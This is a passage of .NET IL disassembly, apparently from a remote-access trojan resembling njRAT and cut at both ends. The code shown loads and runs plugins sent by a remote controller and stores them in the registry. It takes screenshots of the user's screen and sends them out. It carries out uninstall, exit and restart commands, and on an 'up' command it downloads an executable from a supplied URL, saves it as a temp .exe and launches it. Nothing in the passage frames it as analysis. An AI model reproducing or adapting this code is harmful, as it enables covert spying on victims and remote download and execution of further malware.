
      IL_04fa:  ldc.i4.1
      IL_04fb:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0500:  nop
      IL_0501:  nop
      IL_0502:  ldsfld     bool j.OK::Cn
      IL_0507:  ldc.i4.0
      IL_0508:  ceq
      IL_050a:  box        [mscorlib]System.Boolean
      IL_050f:  ldloc.s    objectValue
      IL_0511:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0516:  ldnull
      IL_0517:  ldstr      "Off"
      IL_051c:  ldc.i4.0
      IL_051d:  newarr     [mscorlib]System.Object
      IL_0522:  ldnull
      IL_0523:  ldnull
      IL_0524:  ldnull
      IL_0525:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_052a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_052f:  ldc.i4.1
      IL_0530:  box        [mscorlib]System.Boolean
      IL_0535:  ldc.i4.0
      IL_0536:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareObjectEqual(object,
                                                                                                                              object,
                                                                                                                              bool)
      IL_053b:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0540:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::OrObject(object,
                                                                                                                    object)
      IL_0545:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_054a:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToBoolean(object)
      IL_054f:  ldc.i4.0
      IL_0550:  ceq
      IL_0552:  stloc.s    V_25
      IL_0554:  ldloc.s    V_25
      IL_0556:  brtrue.s   IL_04fa

      IL_0558:  ldloc.s    objectValue
      IL_055a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_055f:  ldnull
      IL_0560:  ldstr      "off"
      IL_0565:  ldc.i4.1
      IL_0566:  newarr     [mscorlib]System.Object
      IL_056b:  dup
      IL_056c:  ldc.i4.0
      IL_056d:  ldc.i4.1
      IL_056e:  box        [mscorlib]System.Boolean
      IL_0573:  stelem.ref
      IL_0574:  ldnull
      IL_0575:  ldnull
      IL_0576:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateSet(object,
                                                                                                                      class [mscorlib]System.Type,
                                                                                                                      string,
                                                                                                                      object[],
                                                                                                                      string[],
                                                                                                                      class [mscorlib]System.Type[])
      IL_057b:  nop
      IL_057c:  nop
      IL_057d:  leave      IL_0dad

      IL_0582:  nop
      IL_0583:  ldloc.0
      IL_0584:  ldc.i4.1
      IL_0585:  ldelem.ref
      IL_0586:  ldc.i4.0
      IL_0587:  newarr     [mscorlib]System.Byte
      IL_058c:  call       object j.OK::GTV(string,
                                            object)
      IL_0591:  castclass  uint8[]
      IL_0596:  stloc.s    buffer3
      IL_0598:  ldloc.0
      IL_0599:  ldc.i4.2
      IL_059a:  ldelem.ref
      IL_059b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_05a0:  ldc.i4.s   10
      IL_05a2:  clt
      IL_05a4:  ldloc.s    buffer3
      IL_05a6:  ldlen
      IL_05a7:  conv.i4
      IL_05a8:  ldc.i4.0
      IL_05a9:  ceq
      IL_05ab:  and
      IL_05ac:  stloc.s    V_27
      IL_05ae:  ldloc.s    V_27
      IL_05b0:  brfalse.s  IL_05f0

      IL_05b2:  ldc.i4.5
      IL_05b3:  newarr     [mscorlib]System.String
      IL_05b8:  dup
      IL_05b9:  ldc.i4.0
      IL_05ba:  ldstr      "pl"
      IL_05bf:  stelem.ref
      IL_05c0:  dup
      IL_05c1:  ldc.i4.1
      IL_05c2:  ldsfld     string j.OK::Y
      IL_05c7:  stelem.ref
      IL_05c8:  dup
      IL_05c9:  ldc.i4.2
      IL_05ca:  ldloc.0
      IL_05cb:  ldc.i4.1
      IL_05cc:  ldelem.ref
      IL_05cd:  stelem.ref
      IL_05ce:  dup
      IL_05cf:  ldc.i4.3
      IL_05d0:  ldsfld     string j.OK::Y
      IL_05d5:  stelem.ref
      IL_05d6:  dup
      IL_05d7:  ldc.i4.4
      IL_05d8:  ldc.i4.1
      IL_05d9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_05de:  stelem.ref
      IL_05df:  call       string [mscorlib]System.String::Concat(string[])
      IL_05e4:  call       bool j.OK::Send(string)
      IL_05e9:  pop
      IL_05ea:  nop
      IL_05eb:  br         IL_0704

      IL_05f0:  nop
      IL_05f1:  ldloc.0
      IL_05f2:  ldc.i4.2
      IL_05f3:  ldelem.ref
      IL_05f4:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_05f9:  ldc.i4.s   10
      IL_05fb:  cgt
      IL_05fd:  stloc.s    V_29
      IL_05ff:  ldloc.s    V_29
      IL_0601:  brfalse.s  IL_0652

      IL_0603:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0608:  stloc.s    stream3
      IL_060a:  ldloc.0
      IL_060b:  ldc.i4.0
      IL_060c:  ldelem.ref
      IL_060d:  ldsfld     string j.OK::Y
      IL_0612:  ldloc.0
      IL_0613:  ldc.i4.1
      IL_0614:  ldelem.ref
      IL_0615:  ldsfld     string j.OK::Y
      IL_061a:  call       string [mscorlib]System.String::Concat(string,
                                                                  string,
                                                                  string,
                                                                  string)
      IL_061f:  callvirt   instance int32 [mscorlib]System.String::get_Length()
      IL_0624:  stloc.s    num3
      IL_0626:  ldloc.s    stream3
      IL_0628:  ldarg.0
      IL_0629:  ldloc.s    num3
      IL_062b:  ldarg.0
      IL_062c:  ldlen
      IL_062d:  conv.i4
      IL_062e:  ldloc.s    num3
      IL_0630:  sub.ovf
      IL_0631:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0636:  nop
      IL_0637:  ldloc.s    stream3
      IL_0639:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_063e:  call       uint8[] j.OK::ZIP(uint8[])
      IL_0643:  stloc.s    buffer3
      IL_0645:  ldloc.0
      IL_0646:  ldc.i4.1
      IL_0647:  ldelem.ref
      IL_0648:  ldloc.s    buffer3
      IL_064a:  ldc.i4.3
      IL_064b:  call       bool j.OK::STV(string,
                                          object,
                                          valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0650:  pop
      IL_0651:  nop
      IL_0652:  nop
      IL_0653:  ldc.i4.5
      IL_0654:  newarr     [mscorlib]System.String
      IL_0659:  dup
      IL_065a:  ldc.i4.0
      IL_065b:  ldstr      "pl"
      IL_0660:  stelem.ref
      IL_0661:  dup
      IL_0662:  ldc.i4.1
      IL_0663:  ldsfld     string j.OK::Y
      IL_0668:  stelem.ref
      IL_0669:  dup
      IL_066a:  ldc.i4.2
      IL_066b:  ldloc.0
      IL_066c:  ldc.i4.1
      IL_066d:  ldelem.ref
      IL_066e:  stelem.ref
      IL_066f:  dup
      IL_0670:  ldc.i4.3
      IL_0671:  ldsfld     string j.OK::Y
      IL_0676:  stelem.ref
      IL_0677:  dup
      IL_0678:  ldc.i4.4
      IL_0679:  ldc.i4.0
      IL_067a:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_067f:  stelem.ref
      IL_0680:  call       string [mscorlib]System.String::Concat(string[])
      IL_0685:  call       bool j.OK::Send(string)
      IL_068a:  pop
      IL_068b:  ldloc.s    buffer3
      IL_068d:  ldstr      "A"
      IL_0692:  call       object j.OK::Plugin(uint8[],
                                               string)
      IL_0697:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_069c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_06a1:  stloc.s    'instance'
      IL_06a3:  ldc.i4.5
      IL_06a4:  newarr     [mscorlib]System.String
      IL_06a9:  dup
      IL_06aa:  ldc.i4.0
      IL_06ab:  ldstr      "ret"
      IL_06b0:  stelem.ref
      IL_06b1:  dup
      IL_06b2:  ldc.i4.1
      IL_06b3:  ldsfld     string j.OK::Y
      IL_06b8:  stelem.ref
      IL_06b9:  dup
      IL_06ba:  ldc.i4.2
      IL_06bb:  ldloc.0
      IL_06bc:  ldc.i4.1
      IL_06bd:  ldelem.ref
      IL_06be:  stelem.ref
      IL_06bf:  dup
      IL_06c0:  ldc.i4.3
      IL_06c1:  ldsfld     string j.OK::Y
      IL_06c6:  stelem.ref
      IL_06c7:  dup
      IL_06c8:  ldc.i4.4
      IL_06c9:  ldloc.s    'instance'
      IL_06cb:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_06d0:  ldnull
      IL_06d1:  ldstr      "GT"
      IL_06d6:  ldc.i4.0
      IL_06d7:  newarr     [mscorlib]System.Object
      IL_06dc:  ldnull
      IL_06dd:  ldnull
      IL_06de:  ldnull
      IL_06df:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateGet(object,
                                                                                                                        class [mscorlib]System.Type,
                                                                                                                        string,
                                                                                                                        object[],
                                                                                                                        string[],
                                                                                                                        class [mscorlib]System.Type[],
                                                                                                                        bool[])
      IL_06e4:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_06e9:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(object)
      IL_06ee:  stloc.s    V_32
      IL_06f0:  ldloca.s   V_32
      IL_06f2:  call       string j.OK::ENB(string&)
      IL_06f7:  stelem.ref
      IL_06f8:  call       string [mscorlib]System.String::Concat(string[])
      IL_06fd:  call       bool j.OK::Send(string)
      IL_0702:  pop
      IL_0703:  nop
      IL_0704:  leave      IL_0dad

      IL_0709:  nop
      IL_070a:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_070f:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0714:  stloc.s    bounds
      IL_0716:  call       class [System.Windows.Forms]System.Windows.Forms.Screen [System.Windows.Forms]System.Windows.Forms.Screen::get_PrimaryScreen()
      IL_071b:  callvirt   instance valuetype [System.Drawing]System.Drawing.Rectangle [System.Windows.Forms]System.Windows.Forms.Screen::get_Bounds()
      IL_0720:  stloc.s    V_41
      IL_0722:  ldloca.s   V_41
      IL_0724:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Width()
      IL_0729:  ldloca.s   bounds
      IL_072b:  call       instance int32 [System.Drawing]System.Drawing.Rectangle::get_Height()
      IL_0730:  ldc.i4     0x21005
      IL_0735:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32,
                                                                                      valuetype [System.Drawing]System.Drawing.Imaging.PixelFormat)
      IL_073a:  stloc.s    image
      IL_073c:  ldloc.s    image
      IL_073e:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_0743:  stloc.s    g
      IL_0745:  ldloc.s    image
      IL_0747:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_074c:  ldloc.s    image
      IL_074e:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_0753:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                    int32)
      IL_0758:  stloc.s    blockRegionSize
      IL_075a:  ldloc.s    g
      IL_075c:  ldc.i4.0
      IL_075d:  ldc.i4.0
      IL_075e:  ldc.i4.0
      IL_075f:  ldc.i4.0
      IL_0760:  ldloc.s    blockRegionSize
      IL_0762:  ldc.i4     0xcc0020
      IL_0767:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::CopyFromScreen(int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 int32,
                                                                                                 valuetype [System.Drawing]System.Drawing.Size,
                                                                                                 valuetype [System.Drawing]System.Drawing.CopyPixelOperation)
      IL_076c:  nop
      .try
      {
        IL_076d:  nop
        IL_076e:  ldc.i4.s   32
        IL_0770:  ldc.i4.s   32
        IL_0772:  newobj     instance void [System.Drawing]System.Drawing.Size::.ctor(int32,
                                                                                      int32)
        IL_0777:  stloc.s    blockRegionSize
        IL_0779:  call       valuetype [System.Drawing]System.Drawing.Point [System.Windows.Forms]System.Windows.Forms.Cursor::get_Position()
        IL_077e:  ldloc.s    blockRegionSize
        IL_0780:  newobj     instance void [System.Drawing]System.Drawing.Rectangle::.ctor(valuetype [System.Drawing]System.Drawing.Point,
                                                                                           valuetype [System.Drawing]System.Drawing.Size)
        IL_0785:  stloc.s    bounds
        IL_0787:  call       class [System.Windows.Forms]System.Windows.Forms.Cursor [System.Windows.Forms]System.Windows.Forms.Cursors::get_Default()
        IL_078c:  ldloc.s    g
        IL_078e:  ldloc.s    bounds
        IL_0790:  callvirt   instance void [System.Windows.Forms]System.Windows.Forms.Cursor::Draw(class [System.Drawing]System.Drawing.Graphics,
                                                                                                   valuetype [System.Drawing]System.Drawing.Rectangle)
        IL_0795:  nop
        IL_0796:  leave.s    IL_07ba

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0798:  dup
        IL_0799:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_079e:  stloc.s    exception12
        IL_07a0:  nop
        IL_07a1:  ldloc.s    exception12
        IL_07a3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_07a8:  nop
        IL_07a9:  ldloc.s    exception12
        IL_07ab:  stloc.s    exception4
        IL_07ad:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_07b2:  nop
        IL_07b3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_07b8:  leave.s    IL_07ba

      }  // end handler
      IL_07ba:  nop
      IL_07bb:  ldloc.s    g
      IL_07bd:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_07c2:  nop
      IL_07c3:  ldloc.0
      IL_07c4:  ldc.i4.1
      IL_07c5:  ldelem.ref
      IL_07c6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_07cb:  ldloc.0
      IL_07cc:  ldc.i4.2
      IL_07cd:  ldelem.ref
      IL_07ce:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_07d3:  newobj     instance void [System.Drawing]System.Drawing.Bitmap::.ctor(int32,
                                                                                      int32)
      IL_07d8:  stloc.s    bitmap2
      IL_07da:  ldloc.s    bitmap2
      IL_07dc:  call       class [System.Drawing]System.Drawing.Graphics [System.Drawing]System.Drawing.Graphics::FromImage(class [System.Drawing]System.Drawing.Image)
      IL_07e1:  stloc.s    g
      IL_07e3:  ldloc.s    g
      IL_07e5:  ldloc.s    image
      IL_07e7:  ldc.i4.0
      IL_07e8:  ldc.i4.0
      IL_07e9:  ldloc.s    bitmap2
      IL_07eb:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Width()
      IL_07f0:  ldloc.s    bitmap2
      IL_07f2:  callvirt   instance int32 [System.Drawing]System.Drawing.Image::get_Height()
      IL_07f7:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::DrawImage(class [System.Drawing]System.Drawing.Image,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32,
                                                                                            int32)
      IL_07fc:  nop
      IL_07fd:  ldloc.s    g
      IL_07ff:  callvirt   instance void [System.Drawing]System.Drawing.Graphics::Dispose()
      IL_0804:  nop
      IL_0805:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_080a:  stloc.s    stream4
      IL_080c:  ldstr      "CAP"
      IL_0811:  ldsfld     string j.OK::Y
      IL_0816:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_081b:  stloc.s    V_32
      IL_081d:  ldloca.s   V_32
      IL_081f:  call       uint8[] j.OK::SB(string&)
      IL_0824:  starg.s    b
      IL_0826:  ldloc.s    stream4
      IL_0828:  ldarg.0
      IL_0829:  ldc.i4.0
      IL_082a:  ldarg.0
      IL_082b:  ldlen
      IL_082c:  conv.i4
      IL_082d:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_0832:  nop
      IL_0833:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0838:  stloc.s    stream5
      IL_083a:  ldloc.s    bitmap2
      IL_083c:  ldloc.s    stream5
      IL_083e:  call       class [System.Drawing]System.Drawing.Imaging.ImageFormat [System.Drawing]System.Drawing.Imaging.ImageFormat::get_Jpeg()
      IL_0843:  callvirt   instance void [System.Drawing]System.Drawing.Image::Save(class [mscorlib]System.IO.Stream,
                                                                                    class [System.Drawing]System.Drawing.Imaging.ImageFormat)
      IL_0848:  nop
      IL_0849:  ldloc.s    stream5
      IL_084b:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0850:  call       string j.OK::md5(uint8[])
      IL_0855:  stloc.s    str2
      IL_0857:  ldloc.s    str2
      IL_0859:  ldsfld     string j.OK::lastcap
      IL_085e:  ldc.i4.0
      IL_085f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_0864:  ldc.i4.0
      IL_0865:  cgt.un
      IL_0867:  stloc.s    V_44
      IL_0869:  ldloc.s    V_44
      IL_086b:  brfalse.s  IL_088f

      IL_086d:  ldloc.s    str2
      IL_086f:  stsfld     string j.OK::lastcap
      IL_0874:  ldloc.s    stream4
      IL_0876:  ldloc.s    stream5
      IL_0878:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_087d:  ldc.i4.0
      IL_087e:  ldloc.s    stream5
      IL_0880:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0885:  conv.ovf.i4
      IL_0886:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_088b:  nop
      IL_088c:  nop
      IL_088d:  br.s       IL_089a

      IL_088f:  nop
      IL_0890:  ldloc.s    stream4
      IL_0892:  ldc.i4.0
      IL_0893:  callvirt   instance void [mscorlib]System.IO.MemoryStream::WriteByte(uint8)
      IL_0898:  nop
      IL_0899:  nop
      IL_089a:  ldloc.s    stream4
      IL_089c:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_08a1:  call       bool j.OK::Sendb(uint8[])
      IL_08a6:  pop
      IL_08a7:  ldloc.s    stream4
      IL_08a9:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_08ae:  nop
      IL_08af:  ldloc.s    stream5
      IL_08b1:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_08b6:  nop
      IL_08b7:  ldloc.s    image
      IL_08b9:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_08be:  nop
      IL_08bf:  ldloc.s    bitmap2
      IL_08c1:  callvirt   instance void [System.Drawing]System.Drawing.Image::Dispose()
      IL_08c6:  nop
      IL_08c7:  leave      IL_0dad

      IL_08cc:  nop
      IL_08cd:  nop
      IL_08ce:  ldloc.0
      IL_08cf:  ldc.i4.1
      IL_08d0:  ldelem.ref
      IL_08d1:  stloc.s    V_45
      IL_08d3:  ldloc.s    V_45
      IL_08d5:  ldstr      "~"
      IL_08da:  ldc.i4.0
      IL_08db:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_08e0:  brfalse.s  IL_0902

      IL_08e2:  ldloc.s    V_45
      IL_08e4:  ldstr      "!"
      IL_08e9:  ldc.i4.0
      IL_08ea:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_08ef:  brfalse.s  IL_090b

      IL_08f1:  ldloc.s    V_45
      IL_08f3:  ldstr      "@"
      IL_08f8:  ldc.i4.0
      IL_08f9:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_08fe:  brfalse.s  IL_091b

      IL_0900:  br.s       IL_093b

      IL_0902:  nop
      IL_0903:  call       void j.OK::UNS()
      IL_0908:  nop
      IL_0909:  br.s       IL_093b

      IL_090b:  nop
      IL_090c:  ldc.i4.0
      IL_090d:  call       void j.OK::pr(int32)
      IL_0912:  nop
      IL_0913:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0918:  nop
      IL_0919:  br.s       IL_093b

      IL_091b:  nop
      IL_091c:  ldc.i4.0
      IL_091d:  call       void j.OK::pr(int32)
      IL_0922:  nop
      IL_0923:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0928:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
      IL_092d:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string)
      IL_0932:  pop
      IL_0933:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::EndApp()
      IL_0938:  nop
      IL_0939:  br.s       IL_093b

      IL_093b:  nop
      IL_093c:  leave      IL_0dad

      IL_0941:  nop
      IL_0942:  ldloc.2
      IL_0943:  ldstr      "up"
      IL_0948:  ldc.i4.0
      IL_0949:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::CompareString(string,
                                                                                                                        string,
                                                                                                                        bool)
      IL_094e:  ldc.i4.0
      IL_094f:  cgt.un
      IL_0951:  stloc.s    V_46
      IL_0953:  ldloc.s    V_46
      IL_0955:  brfalse.s  IL_095c

      IL_0957:  br         IL_0b1c

      IL_095c:  nop
      IL_095d:  ldnull
      IL_095e:  stloc.s    bytes
      IL_0960:  ldloc.0
      IL_0961:  ldc.i4.1
      IL_0962:  ldelem.ref
      IL_0963:  ldc.i4.0
      IL_0964:  callvirt   instance char [mscorlib]System.String::get_Chars(int32)
      IL_0969:  ldc.i4.s   31
      IL_096b:  ceq
      IL_096d:  stloc.s    V_47
      IL_096f:  ldloc.s    V_47
      IL_0971:  brfalse    IL_0a00

      .try
      {
        IL_0976:  nop
        IL_0977:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_097c:  stloc.s    stream6
        IL_097e:  ldloc.0
        IL_097f:  ldc.i4.0
        IL_0980:  ldelem.ref
        IL_0981:  ldsfld     string j.OK::Y
        IL_0986:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_098b:  callvirt   instance int32 [mscorlib]System.String::get_Length()
        IL_0990:  stloc.s    num4
        IL_0992:  ldloc.s    stream6
        IL_0994:  ldarg.0
        IL_0995:  ldloc.s    num4
        IL_0997:  ldarg.0
        IL_0998:  ldlen
        IL_0999:  conv.i4
        IL_099a:  ldloc.s    num4
        IL_099c:  sub.ovf
        IL_099d:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_09a2:  nop
        IL_09a3:  ldloc.s    stream6
        IL_09a5:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_09aa:  call       uint8[] j.OK::ZIP(uint8[])
        IL_09af:  stloc.s    bytes
        IL_09b1:  leave      IL_0a62

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_09b6:  dup
        IL_09b7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_09bc:  stloc.s    exception13
        IL_09be:  nop
        IL_09bf:  ldloc.s    exception13
        IL_09c1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_09c6:  nop
        IL_09c7:  ldloc.s    exception13
        IL_09c9:  stloc.s    exception5
        IL_09cb:  ldstr      "MSG"
        IL_09d0:  ldsfld     string j.OK::Y
        IL_09d5:  ldstr      "Update ERROR"
        IL_09da:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_09df:  call       bool j.OK::Send(string)
        IL_09e4:  pop
        IL_09e5:  ldstr      "bla"
        IL_09ea:  call       bool j.OK::Send(string)
        IL_09ef:  pop
        IL_09f0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_09f5:  nop
        IL_09f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_09fb:  leave      IL_0dad

      }  // end handler
      IL_0a00:  nop
      IL_0a01:  newobj     instance void [System]System.Net.WebClient::.ctor()
      IL_0a06:  stloc.s    client2
      .try
      {
        IL_0a08:  nop
        IL_0a09:  ldloc.s    client2
        IL_0a0b:  ldloc.0
        IL_0a0c:  ldc.i4.1
        IL_0a0d:  ldelem.ref
        IL_0a0e:  callvirt   instance uint8[] [System]System.Net.WebClient::DownloadData(string)
        IL_0a13:  stloc.s    bytes
        IL_0a15:  leave.s    IL_0a61

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0a17:  dup
        IL_0a18:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0a1d:  stloc.s    exception14
        IL_0a1f:  nop
        IL_0a20:  ldloc.s    exception14
        IL_0a22:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0a27:  nop
        IL_0a28:  ldloc.s    exception14
        IL_0a2a:  stloc.s    exception6
        IL_0a2c:  ldstr      "MSG"
        IL_0a31:  ldsfld     string j.OK::Y
        IL_0a36:  ldstr      "Update ERROR"
        IL_0a3b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0a40:  call       bool j.OK::Send(string)
        IL_0a45:  pop
        IL_0a46:  ldstr      "bla"
        IL_0a4b:  call       bool j.OK::Send(string)
        IL_0a50:  pop
        IL_0a51:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0a56:  nop
        IL_0a57:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_0a5c:  leave      IL_0dad

      }  // end handler
      IL_0a61:  nop
      IL_0a62:  nop
      IL_0a63:  ldstr      "bla"
      IL_0a68:  call       bool j.OK::Send(string)
      IL_0a6d:  pop
      IL_0a6e:  call       string [mscorlib]System.IO.Path::GetTempFileName()
      IL_0a73:  ldstr      ".exe"
      IL_0a78:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0a7d:  stloc.s    fileName
      .try
      {
        IL_0a7f:  nop
        IL_0a80:  ldstr      "MSG"
        IL_0a85:  ldsfld     string j.OK::Y
        IL_0a8a:  ldstr      "Updating To "
        IL_0a8f:  ldloc.s    fileName
        IL_0a91:  newobj     instance void [mscorlib]System.IO.FileInfo::.ctor(string)
        IL_0a96:  callvirt   instance string [mscorlib]System.IO.FileInfo::get_Name()
        IL_0a9b:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string,
                                                                    string)
        IL_0aa0:  call       bool j.OK::Send(string)
        IL_0aa5:  pop
        IL_0aa6:  ldc.i4     0x7d0
        IL_0aab:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
        IL_0ab0:  nop
        IL_0ab1:  ldloc.s    fileName
        IL_0ab3:  ldloc.s    bytes
        IL_0ab5:  call       void [mscorlib]System.IO.File::WriteAllBytes(string,
                                                                          uint8[])
        IL_0aba:  nop
        IL_0abb:  ldloc.s    fileName
        IL_0abd:  ldstr      ".."
        IL_0ac2:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::Start(string,
                                                                                                                string)
        IL_0ac7:  pop
        IL_0ac8:  leave.s    IL_0b10

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0aca:  dup
        IL_0acb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0ad0:  stloc.s    exception15
        IL_0ad2:  nop
        IL_0ad3:  ldloc.s    exception15
        IL_0ad5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0ada:  nop
        IL_0adb:  ldloc.s    exception15
        IL_0add:  stloc.s    exception7
        IL_0adf:  ldstr      "MSG"
        IL_0ae4:  ldsfld     string j.OK::Y
        IL_0ae9:  ldstr      "Update ERROR "
        IL_0aee:  ldloc.s    exception7
